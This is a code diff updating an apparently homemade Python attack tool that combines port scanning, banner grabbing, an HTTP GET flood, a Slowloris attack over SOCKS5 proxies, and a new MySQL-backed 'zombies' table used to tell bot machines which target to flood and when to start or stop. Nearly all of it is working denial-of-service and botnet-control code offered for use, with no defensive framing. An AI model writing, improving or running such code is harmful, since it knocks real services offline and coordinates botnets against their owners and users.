@@ -1,20 +1,17 @@
 # -*- coding: utf-8 -*-
-from gevent import monkey;
+from gevent import monkey
 monkey.patch_all()
-import sys, os, random, requests, time, socket, argparse, errno, queue, struct, threading, ssl
-from threading import Thread, Event
-from urllib.parse import urlparse, unquote
 from gevent.pool import Pool
-
+import sys, os, random, time, socket, argparse, errno, struct, threading, ssl
+import pymysql, requests
 
 # versioning
-VERSION = (1, 0, 0)
+VERSION = (1, 1, 0)
 __version__ = '%d.%d.%d' % VERSION[0:3]
 
 # if python ver < 3.5
 if sys.version_info[0:2] < (3, 5):
     raise RuntimeError('[-]Python 3.5 or higher is required!')
-
 
 def get_host_ip():
     try:
@@ -23,12 +20,11 @@ def get_host_ip():
         hostip = s.getsockname()[0]
 
     except Exception:
-        hostip = "172.16.28.169"
+        hostip = "localhost"
     finally:
         s.close()
 
     return hostip
-
 
 def headerOfmain():
     print('''\
@@ -40,6 +36,21 @@ def headerOfmain():
                            By SuPer.Jz                    
 
         ''')
+
+
+class Logger:
+    def __init__(self, filename):
+        self.terminal = sys.stdout
+        self.filename = filename
+        self.log = open(filename, "a")
+        self.log.write("Log of " + time.ctime())
+
+    def write(self, message):
+        self.terminal.write(message)
+        self.log.write(message)
+
+    def flush(self):
+        pass
 
 
 # Port Numbers Extractor
@@ -74,7 +85,6 @@ def port_extraction(port):
     tmplist.sort()
     return tmplist
 
-
 # Checking About User Input Data is IP Or Host
 def valid_ip(ip):
     '''Verifying IP Address'''
@@ -84,15 +94,13 @@ def valid_ip(ip):
         ip = socket.gethostbyname(ip)
     return ip
 
-
 class PortScanner():
-    def __init__(self, target, allRanges, threads):
+    def __init__(self, target, allRanges, coroutines):
         self.dest_ip = target
         self.source_ip = get_host_ip()
-        self.threads = threads
+        self.coroutines = coroutines
         self.allRanges = allRanges
         self.openPort = set()
-
 
     def __checksum(self, msg):
         ''' Check Summing '''
@@ -119,7 +127,7 @@ class PortScanner():
         ''' Set the IP header manually '''
 
         s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        # s.settimeout(1)
+        s.settimeout(args.timeout)
         return s
 
     def __CreateIpHeader(self, source_ip, dest_ip):
@@ -203,31 +211,41 @@ class PortScanner():
         except socket.timeout:
             pass
 
+    def scan(self, port):
+        print("scanning " + str(port))
+        s = socket.socket()
+        s.settimeout(args.timeout)
+        if s.connect_ex((self.dest_ip, port)) == 0:
+            self.openPort.add(port)
+            #print("Port %s Open" % str(port))
+        s.close()
+
     def startScan(self):
         print("[*]Starting Port Scan")
         starttime = time.time()
-        pool = Pool(10)
 
-        pool.map(self.SynScan, range(1, 1000))
+        pool = Pool(self.coroutines)
+        pool.map(self.scan, self.allRanges)
         pool.join()
+
         closetime = time.time()
 
         tmplist = list(self.openPort)
         tmplist.sort()
         for i in tmplist:
             print("[+]Port %s Open" % i)
+
         print("[+] Scan Started On ", time.ctime(starttime))
         print("[+] Scan Finished On", time.ctime(closetime))
         print('[+] Total Time Taken ', end=" ")
         print(round(closetime - starttime, 2), ' Seconds ')
 
-
+        return list(self.openPort)
 
 # Banner Grabbing Class
 class BannerGrabber():
-    def __init__(self, host, thread, output):
+    def __init__(self, host, output):
         self.host = host
-        self.thread = thread
         self.output = output
         self.banners = dict()
         self.iter_address()
@@ -235,13 +253,9 @@ class BannerGrabber():
         # iter All Address
 
     def iter_address(self):
-        starttime = time.time()
-
         # iter Host Iterms
         for address, port in self.host.items():
             self.start_threading(address, port)
-
-        closetime = time.time()
 
         print("\n\n", '*' * 50, '\n')
 
@@ -265,13 +279,6 @@ class BannerGrabber():
             else:
                 print("Port:%s|Service：%s" % (i, bann))
 
-        if self.output:
-            f = open(self.output, 'a')
-            for address, port in self.host.items():
-                f.write("{} | {} | {}".format(i[0][0], i[0][1], [i[1]]))
-            f.close()
-        return
-
         # Start threadings
 
     def start_threading(self, address, port):
@@ -284,7 +291,6 @@ class BannerGrabber():
         # Wait For All Threads
         for i in listthread:
             i.join()
-        return
 
         # Banner Grabbing Functions
 
@@ -309,30 +315,17 @@ class BannerGrabber():
         s.close()
         return
 
-
 class HTTPFlooder():
     def __init__(self):
-        self.proxy_file = 'files/proxy.txt'
+        #self.proxy_file = 'files/proxy.txt'
         self.ua_file = 'files/user-agents.txt'
         self.ref_file = 'files/referers.txt'
         self.ref = []
         self.ua = []
         self.parseFiles()
-        self.ex = Event()
+        self.ex = threading.Event()
 
     def parseFiles(self):
-        # trying to find and parse file with proxies
-        try:
-            if os.stat(self.proxy_file).st_size > 0:
-                with open(self.proxy_file) as proxy:
-                    global ips
-                    ips = [row.rstrip() for row in proxy]
-            else:
-                print('[-]Error: File %s is empty!' % self.proxy_file)
-                sys.exit()
-        except OSError:
-            print('[-]Error: %s was not found!' % self.proxy_file)
-            sys.exit()
         # trying to find and parse file with User-Agents
         try:
             if os.stat(self.ua_file).st_size > 0:
@@ -344,12 +337,12 @@ class HTTPFlooder():
         except OSError:
             print('[-]Error: %s was not found!' % self.ua_file)
             sys.exit()
+
         # trying to find and parse file with referers
         try:
             if os.stat(self.ref_file).st_size > 0:
                 with open(self.ref_file) as referers:
-                    global ref
-                    ref = [row.rstrip() for row in referers]
+                    self.ref = [row.rstrip() for row in referers]
             else:
                 print('[-]Error: File %s is empty!' % self.ref_file)
                 sys.exit()
@@ -357,45 +350,42 @@ class HTTPFlooder():
             print('[-]Error: %s was not found!' % self.ref_file)
             sys.exit()
         # parse end
+
         # messaging statistics
         if args.verbosity > 0:
-            print('[+]Loaded: {} proxies, {} user-agents, {} referers'.format(len(ips), len(self.ua), len(ref)))
+            print('[+]Loaded: {} user-agents, {} referers'.format(len(self.ua), len(self.ref)))
 
-    def request(self, index):
+    def request(self):
         err_count = 0
-        global url
         while not self.ex.is_set():
             timestamp = str(int(time.time()))
             headers = {'User-Agent': random.choice(self.ua),
-                       'Referer': random.choice(ref) + url,
+                       'Referer': random.choice(self.ref) + args.target,
                        'Accept-Encoding': 'gzip;q=0,deflate,sdch',
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache'}
 
-            if args.proxy:
-                proxy = {proto: ips[index]}
-            else:
-                proxy = None
+            proxy = None
 
             try:
                 if args.verbosity > 0:
                     print("[+] HTTP packet sent")
+
                 if args.auth:
                     from requests.auth import HTTPBasicAuth
-                    r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout,
+                    r = requests.get(args.target + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout,
                                      auth=HTTPBasicAuth(auth_login, auth_pass))
                 else:
                     # request = requests.Request(url, data, headers)
                     # urllib.request.urlopen(request)
-                    r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout)
-                    time.sleep(1)
+                    r = requests.get(args.target + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout)
+                    #time.sleep(1)
                     # r= requests.post(url, headers=headers, proxies=proxy, timeout=args.timeout, data=data)
                 if r.status_code == 301 or r.status_code == 302 or r.status_code == 307:
                     url = r.headers['Location']
                     print('[!]Request was redirected to {}'.format(url))
+                time.sleep(1)
 
-                if r.status_code == 403 or r.status_code == 400:
-                    print("[!]Proxy " + ips[index] + " refuse to connect")
             except requests.exceptions.ChunkedEncodingError:
                 pass
             except requests.exceptions.ConnectionError:
@@ -404,43 +394,16 @@ class HTTPFlooder():
                 pass
 
             if err_count >= 20:
-                if args.proxy:
-                    try:
-                        if args.auth:
-                            r = requests.get(url + '?' + timestamp, headers=headers,
-                                             timeout=args.timeout,
-                                             auth=HTTPBasicAuth(auth_login, auth_pass))
-                        else:
-                            r = requests.get(url + '?' + timestamp, headers=headers,
-                                             timeout=args.timeout)
-                        if r.status_code == 200:
-                            print("[!]Proxy " + ips[index] + " has been kicked from attack due to it's nonoperability")
-                    except requests.exceptions.ConnectionError:
-                        print("[+]Target Down!")
-
-                else:
-                    print("[+]Target Down!")
-                return
+                print("[+]Target Down or IP banned")
 
     # Creating a thread pool
     def startAttack(self):
         threads = []
-        i = 0
-        # print(ips)
-        # for thread in range(0, len(ips)*num):
-        if not args.proxy:
-            for thread in range(args.threads):
-                t = threading.Thread(target=self.request, args=(i,))
-                t.daemon = True
-                t.start()
-                threads.append(t)
-        else:
-            for i in range(len(ips) * args.threads):
-                index = int(i / args.threads)
-                t = threading.Thread(target=self.request, args=(index,))
-                t.daemon = True
-                t.start()
-                threads.append(t)
+        for thread in range(args.threads):
+            t = threading.Thread(target=self.request)
+            t.daemon = True
+            t.start()
+            threads.append(t)
 
         try:
             while True:
@@ -456,13 +419,14 @@ class HTTPFlooder():
         if args.proxy:
             try:
                 import socks
-                proxyip = ips[0].split(":")[0]
-                proxyport = ips[0].split(":")[1]
+                proxyip = args.proxy[0]
+                proxyport = args.proxy[1]
                 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
                 socket.socket = socks.socksocket
                 print("[*]Using SOCKS5 proxy for connecting...")
             except ImportError:
                 print("[*]Socks Proxy Library Not Available!")
+                exit(0)
 
         list_of_sockets = []
         socket_count = args.sockets
@@ -512,42 +476,70 @@ class HTTPFlooder():
         s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
         return s
 
-'''
-def DDOS():
-    conn = pymysql.connect(host='localhost', user='root', passwd='root')
-    cursor = conn.cursor()
-    cursor.execute("""create database if not exists zombies """)
-    cursor.execute("""use zombies """)
-    # cursor.execute("""drop table zombie""")
-    cursor.execute("""create table zombie(id int AUTO_INCREMENT , ip varchar(20), 
-                      target varchar(100)  ,attack int default 0 , threads int default 4000, primary key(id)) """)
+    def initTable(self, host, user, passwd):
+        conn = pymysql.connect(host=host, user=user, passwd=passwd)
+        cursor = conn.cursor()
+        cursor.execute("""create database if not exists zombies """)
+        cursor.execute("""use zombies """)
+        # cursor.execute("""drop table zombie""")
+        cursor.execute("""create table if not exists  zombie(id int AUTO_INCREMENT , ip varchar(20), 
+                          target varchar(100)  ,attack int default 0 , threads int default 4000, primary key(id)) """)
 
-    cursor.close()
-    conn.commit()
-    conn.close()
+        cursor.close()
+        conn.commit()
+        conn.close()
 
+    def startDDos(self ,host ,user, passwd):
+        db = pymysql.connect(host=host, user=user,
+                             password=passwd, db="zombies", port=3306)
+        cursor = db.cursor()
+        uodatesql = "update  zombie  set target = \"" + args.target + "\";"
+        uodatesql2 = "update zombie set attack = 1 ;"
 
-def startDDos():
-    db = pymysql.connect(host="localhost", user="root",
-                         password="root", db="zombies", port=3306)
-    cursor = db.cursor()
-    uodatesql = "update  zombie  set target = \"" + args.target + "\";"
-    uodatesql2 = "update zombie set attack = 1 ;"
+        try:
+            cursor.execute(uodatesql)
+            cursor.execute(uodatesql2)
+            db.commit()
+        except Warning as e:
+            print(e)
+        except Exception as e:
+            db.rollback()
+            raise e
+        finally:
+            db.close()
 
-    try:
-        cursor.execute(uodatesql)
-        cursor.execute(uodatesql2)
-        db.commit()
-    except Exception as e:
-        db.rollback()
-        raise e
-    finally:
-        db.close()
-'''
+    def stopDDos(self, host, user, passwd):
+        db = pymysql.connect(host=host, user=user,
+                             password=passwd, db="zombies", port=3306)
+        cursor = db.cursor()
+        #uodatesql = "update  zombie  set target = \"" + args.target + "\";"
+        uodatesql2 = "update zombie set attack = 0 ;"
+
+        try:
+            #cursor.execute(uodatesql)
+            cursor.execute(uodatesql2)
+            db.commit()
+        except Exception as e:
+            db.rollback()
+            raise e
+        finally:
+            db.close()
+
+    def DDos(self, host ,user, passwd, port):
+        print("Initing Database...")
+        self.initTable(host=host, user=user, passwd=passwd)
+        while True:
+            print("Start or Stop? (exit to quit)")
+            choice = input()
+            if choice.lower() == "start":
+                self.startDDos(host ,user, passwd)
+            elif choice.lower() == "stop":
+                self.stopDDos(host ,user, passwd)
+            elif choice.lower() == "quit":
+                exit(0)
+
 
 if __name__ == '__main__':
-    #TODO: distributed
-    #TODO: improve flood with gevent
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawDescriptionHelpFormatter,
         # description=textwrap.dedent('''\
@@ -557,21 +549,16 @@ if __name__ == '__main__':
     parser.add_argument("-S", "--SynScan",
                         help="Perform a TCP SYN scan to target", action="store_true")
 
-    parser.add_argument("-F", "--FinScan",
-                        help="Perform a TCP FIN scan to target", action="store_true")
-
     parser.add_argument("-H", help="Perform a Service scan to target", action="store_true")
 
     parser.add_argument('target', help="the target you want to attack  e.g. http://192.168.1.1:8080/test.jpg")
     parser.add_argument('-T', '--threads', help="how many threads do you want ", type=int, default=100)
-    parser.add_argument('-P', '--proxy',
-                        help="enable proxy mode, reading proxies from file, note that each proxy creates one thread, not too many proxies in files",
-                        action="store_true")
 
-    #TODO: Proxy need to be cared
+
+
     parser.add_argument('-a', "--auth", help="authentication if http/https needs e.g. <zhe6652 password.>", nargs=2)
     parser.add_argument('-t', "--timeout", help="timeout for connection",
-                        type=float, default=1)
+                        type=float, default=2)
 
     parser.add_argument("-p", "--port",
                         help="Specify Target Ports Seperated by commas or Provide Range of Ports. eg. 80-1200",
@@ -583,28 +570,28 @@ if __name__ == '__main__':
     parser.add_argument('-o', "--output", dest="output", help="Specify Path For Saving Output in Txt.",
                         default=None)
 
-    #TODO:OUTPUT Needs to be cared
-
     parser.add_argument('--slowloris', action="store_true", help="Use Slowloris for attack")
     parser.add_argument("--https", help="Use https for Slowloris", action="store_true",
                         )
 
     parser.add_argument('-s', '--sockets', default=500, help="Number of sockets to use in Slowloris", type=int)
+    parser.add_argument('-P', '--proxy',
+                        help="enable proxy mode for slowloris(socks)", nargs=2)
+    parser.add_argument('-D', '--DDos',
+                        help="DDos options for attacking e.g. user=xxx host=xxx  port=xxx passwd=xxx", nargs='*')
+
 
     args = parser.parse_args()
     headerOfmain()
     # DDOS()
     #startDDos()
+    if args.output:
+        sys.stdout = Logger(args.output)
 
     if args.SynScan:
         ports = port_extraction(args.port)
         scan = PortScanner(args.target, ports, args.threads)
         scan.startScan()
-
-    if args.FinScan:
-        ports = port_extraction(args.port)
-        scan = PortScanner(args.target, ports, args.threads)
-        scan.startScan("F")
 
     if args.H:
         host = {}
@@ -615,23 +602,32 @@ if __name__ == '__main__':
             print("[*] IP Address Detected : {} | Num. Of Port Input : {}".format(h, len(p)))
 
         scan = PortScanner(args.target, ports, args.threads)
-        openPorts = scan.startScan("S")
+        openPorts = scan.startScan()
         print("[*] Open Ports Verified.\n[+] IP : {} | Ports : {}".format(args.target, openPorts))
-        host[args.target] = openPorts
-        BannerGrabber(host, args.threads, args.output)
+        openhost = dict()
+        openhost[args.target] = openPorts
+        #print(host)
+        BannerGrabber(openhost, args.output)
 
     if args.slowloris:
         sl = HTTPFlooder()
         sl.Slowloris()
 
-    if not (args.SynScan or args.FinScan or args.H or args.slowloris):
-        global url
-        url = unquote(args.target)
-        # defining protocol
-        global proto
-        link = urlparse(url)
-        proto = link.scheme
+    if args.DDos:
+        vardict = {}
+        for item in args.DDos:
+            i = item.split("=")
+            vardict[i[0]] = i[1]
 
+        user = vardict["user"]
+        passwd = vardict["passwd"]
+        port = vardict["port"]
+        host = vardict["host"]
+
+        ddos=HTTPFlooder()
+        ddos.DDos(host ,user, passwd, port)
+
+    if not (args.SynScan or args.H or args.slowloris):
         if args.auth:
             global auth_login
             global auth_pass
@@ -639,12 +635,5 @@ if __name__ == '__main__':
             auth_pass = args.auth[1]
 
         fd = HTTPFlooder()
-        if "http://" not in args.target:
-            print("Url should begin with \"http://\"")
-            exit(0)
-
         print('[+]Start sending requests...')
         fd.startAttack()
-
-
-
